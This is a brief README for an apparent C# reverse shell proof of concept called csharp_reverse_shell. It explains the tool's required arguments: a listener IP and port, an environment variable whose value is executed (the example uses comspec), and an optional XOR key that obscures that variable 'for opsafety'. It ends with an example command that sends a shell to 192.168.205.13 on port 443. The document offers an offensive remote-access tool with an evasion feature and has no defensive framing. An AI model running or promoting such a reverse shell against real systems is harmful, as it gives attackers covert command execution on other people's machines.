# csharp_reverse_shell
c# reverse shell poc

Executes whatever is set in the specified environment variable (3rd argument),

The environment variable can also be passed as an XORed string with an integer (4th argument) for opsafety --yeah right

All arguments are required,

e.g > csharp_reverse_shell.exe 192.168.205.13 443 comspec 00
